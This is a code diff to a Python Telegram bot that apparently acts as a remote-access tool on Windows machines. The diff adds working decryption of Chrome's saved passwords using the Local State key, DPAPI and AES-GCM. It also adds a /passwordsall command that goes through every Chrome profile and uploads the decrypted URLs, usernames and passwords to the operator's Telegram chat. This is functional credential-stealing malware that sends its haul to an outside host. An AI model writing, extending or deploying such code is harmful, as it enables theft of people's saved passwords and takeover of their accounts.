@@ -26,6 +26,9 @@ import hashlib
 import tempfile
 import zipfile
 import psutil
+import win32crypt
+from Crypto.Cipher import AES
+import base64
 
 BOT_TOKEN: str = 'YOUR_BOT_TOKEN_HERE'
 PASSWORD: str = '1234567B'
@@ -149,23 +152,60 @@ def monitor_network_connections() -> None:
             pass
         time.sleep(30)
 
+def decrypt_chrome_password(encrypted_value: bytes) -> str:
+    try:
+        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
+    except:
+        try:
+            local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            encrypted_key = encrypted_key[5:]
+            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            
+            nonce = encrypted_value[3:15]
+            ciphertext = encrypted_value[15:-16]
+            tag = encrypted_value[-16:]
+            
+            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted.decode('utf-8')
+        except Exception:
+            return "[CANNOT DECRYPT]"
+
 def extract_chrome_passwords() -> list[tuple[str, str, str]]:
     passwords: list[tuple[str, str, str]] = []
     chrome_login_path: str = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
     
     if os.path.exists(chrome_login_path):
         try:
+            time.sleep(1)
+            
             temp_db: str = os.path.join(tempfile.gettempdir(), "chrome_passwords.db")
             shutil.copy2(chrome_login_path, temp_db)
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
             for row in cursor.fetchall():
-                passwords.append((row[0][:100], row[1], "[ENCRYPTED]"))
+                url = row[0][:100]
+                username = row[1] if row[1] else "[NO USERNAME]"
+                
+                if row[2]:
+                    try:
+                        decrypted_pwd = decrypt_chrome_password(row[2])
+                        passwords.append((url, username, decrypted_pwd))
+                    except:
+                        passwords.append((url, username, "[DECRYPT FAILED]"))
+                else:
+                    passwords.append((url, username, "[NO PASSWORD]"))
+            
             conn.close()
             os.remove(temp_db)
-        except:
-            pass
+        except Exception as e:
+            print(f"Error: {e}")
     
     return passwords
 
@@ -282,7 +322,8 @@ COMMAND LIST:
 /wifilist - Show saved Wi-Fi networks
 /wifipass [name] - Show Wi-Fi password
 /netstat - Show active connections
-/passwords - Chrome login data extraction (URLs and usernames)
+/passwords - Extract Chrome saved passwords with decryption
+/passwordsall - Extract passwords from all Chrome profiles
 /chrome [url] - Open URL in Chrome
 /edge [url] - Open URL in Edge
 /firefox [url] - Open URL in Firefox
@@ -727,15 +768,88 @@ def wifipass_command(message: telebot.types.Message) -> None:
 @authenticated
 def extract_passwords(message: telebot.types.Message) -> None:
     bot.send_message(message.chat.id, "Extracting saved passwords...")
-    passwords: list[tuple[str, str, str]] = extract_chrome_passwords()
     
-    if passwords:
-        response: str = "Saved Chrome Passwords:\n\n"
-        for url, username, pwd in passwords[:10]:
-            response += f"URL: {url}\nUser: {username}\nPass: {pwd}\n\n"
-        bot.send_message(message.chat.id, response[:4000])
-    else:
-        bot.send_message(message.chat.id, "No passwords found")
+    try:
+        passwords: list[tuple[str, str, str]] = extract_chrome_passwords()
+        
+        if passwords:
+            if len(passwords) > 20:
+                filename = "chrome_passwords.txt"
+                with open(filename, 'w', encoding='utf-8') as f:
+                    for url, username, pwd in passwords:
+                        f.write(f"URL: {url}\nUsername: {username}\nPassword: {pwd}\n\n")
+                
+                with open(filename, 'rb') as f:
+                    bot.send_document(message.chat.id, f, caption=f"Found {len(passwords)} passwords")
+                os.remove(filename)
+            else:
+                response = f"Found {len(passwords)} passwords:\n\n"
+                for url, username, pwd in passwords[:10]:
+                    response += f"URL: {url}\nUser: {username}\nPass: {pwd}\n\n"
+                bot.send_message(message.chat.id, response[:4000])
+        else:
+            bot.send_message(message.chat.id, "No passwords found")
+    except ImportError:
+        bot.send_message(message.chat.id, "Install required: pip install pypiwin32 pycryptodome")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {str(e)[:200]}")
+
+@bot.message_handler(commands=['passwordsall'])
+@authenticated
+def extract_all_passwords(message: telebot.types.Message) -> None:
+    bot.send_message(message.chat.id, "Extracting from all profiles...")
+    
+    try:
+        chrome_base = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
+        all_found = {}
+        
+        if os.path.exists(chrome_base):
+            profiles = ['Default']
+            for item in os.listdir(chrome_base):
+                if item.startswith('Profile '):
+                    profiles.append(item)
+            
+            for profile in profiles:
+                login_path = os.path.join(chrome_base, profile, "Login Data")
+                if os.path.exists(login_path):
+                    temp_db = os.path.join(tempfile.gettempdir(), f"chrome_{profile}.db")
+                    shutil.copy2(login_path, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    
+                    profile_pwds = []
+                    for row in cursor.fetchall():
+                        if row[2]:
+                            try:
+                                pwd = decrypt_chrome_password(row[2])
+                                profile_pwds.append((row[0][:80], row[1] or "NO USER", pwd))
+                            except:
+                                pass
+                    
+                    if profile_pwds:
+                        all_found[profile] = profile_pwds
+                    conn.close()
+                    os.remove(temp_db)
+            
+            if all_found:
+                filename = "all_passwords.txt"
+                with open(filename, 'w', encoding='utf-8') as f:
+                    total = 0
+                    for profile, pwds in all_found.items():
+                        f.write(f"\n{profile}:\n")
+                        f.write("="*40 + "\n")
+                        for url, user, pwd in pwds:
+                            f.write(f"URL: {url}\nUser: {user}\nPass: {pwd}\n\n")
+                            total += 1
+                
+                with open(filename, 'rb') as f:
+                    bot.send_document(message.chat.id, f, caption=f"Total: {total} passwords")
+                os.remove(filename)
+            else:
+                bot.send_message(message.chat.id, "No passwords found")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {str(e)[:200]}")
 
 @bot.message_handler(commands=['netstat'])
 @authenticated
